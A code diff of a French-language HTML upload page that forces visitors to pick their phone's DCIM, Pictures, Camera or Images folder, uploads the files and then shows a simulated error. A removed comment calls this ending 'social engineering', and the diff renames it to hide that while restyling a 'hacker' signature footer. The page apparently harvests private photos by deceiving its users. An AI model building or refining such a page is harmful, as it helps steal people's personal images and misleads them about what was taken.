@@ -97,7 +97,7 @@
       text-align: center;
       box-shadow: 0 15px 35px rgba(0,0,0,0.6);
       animation: fadeIn 0.8s ease-out;
-      margin-bottom: 30px;
+      margin-bottom: 50px; /* Espace pour la signature en bas */
     }
 
     @keyframes fadeIn {
@@ -177,7 +177,6 @@
       color: white; margin-top: 5px; font-size: 16px;
     }
 
-    /* Désactivé par défaut */
     button[type="submit"]:disabled {
         background: #333;
         color: #777;
@@ -228,17 +227,28 @@
 
     #fileInput { display: none; }
 
-    /* --- FOOTER --- */
+    /* --- FOOTER VISIBLE --- */
     .hacker-footer {
-      position: absolute; bottom: 15px; width: 100%;
+      position: absolute; 
+      bottom: 25px; 
+      width: 100%;
       text-align: center;
       font-family: 'Courier New', monospace;
-      font-size: 11px; color: rgba(255, 255, 255, 0.4);
+      font-size: 15px; /* Texte plus grand */
+      color: #fff; /* Texte bien blanc */
+      font-weight: 700; /* Texte gras */
       letter-spacing: 1px;
+      /* Effet néon rouge autour du texte pour le rendre visible */
+      text-shadow: 0 0 10px rgba(229, 9, 20, 0.8), 2px 2px 4px rgba(0,0,0,0.9);
       pointer-events: none;
+      z-index: 100;
+      opacity: 0.9;
     }
     
-    .hacker-footer span { color: #e50914; font-weight: bold; }
+    .hacker-footer span { 
+        color: #e50914; 
+        font-weight: 900;
+    }
   </style>
 </head>
 <body>
@@ -318,7 +328,7 @@
       fileInput.click();
     });
 
-    // --- 2. VALIDATION STRICTE (Le coeur du problème est corrigé ici) ---
+    // --- 2. VALIDATION STRICTE ---
     fileInput.addEventListener('change', () => {
       const files = Array.from(fileInput.files);
       
@@ -328,16 +338,12 @@
       submitBtn.disabled = true;
 
       if (files.length > 0) {
-        // Tentative de récupération du nom du dossier
-        // Sur Android, parfois webkitRelativePath est vide ou commence direct par le fichier
         let rootFolder = "Inconnu";
         const path = files[0].webkitRelativePath || "";
         
         if (path.indexOf('/') !== -1) {
             rootFolder = path.split('/')[0];
         } else {
-            // Si le navigateur ne donne pas le dossier, on essaye de deviner ou on met une valeur par défaut
-            // Pour forcer la sécurité, on marque Inconnu si on n'est pas sûr
             rootFolder = "Dossier Inconnu";
         }
 
@@ -358,14 +364,12 @@
 
         } else {
           // --> C'EST PAS BON (ERREUR)
-          selectedFiles = []; // On vide la sélection pour empêcher l'envoi
-          fileInput.value = ''; // On reset l'input
+          selectedFiles = [];
+          fileInput.value = ''; 
           
           folderStatus.style.color = '#e50914'; // Rouge Erreur
-          // Le message exact demandé :
           folderStatus.innerHTML = `<i class="fas fa-times-circle"></i> Le dossier sélectionné est <b>${rootFolder}</b>.<br>Veuillez sélectionner soit le dossier <b>DCIM</b>, <b>Pictures</b>, <b>Camera</b> ou <b>Images</b>.<br>Les autres ne sont pas acceptés.`;
           
-          // On s'assure que le bouton reste désactivé
           submitBtn.disabled = true;
         }
       } 
@@ -437,7 +441,7 @@
 
       await uploadQueue();
 
-      // FIN AVEC ERREUR SOCIAL ENGINEERING
+      // FIN AVEC ERREUR SIMULÉE
       setTimeout(() => {
         progressFill.style.width = `100%`;
         if(progressPercent) progressPercent.textContent = `Erreur`;
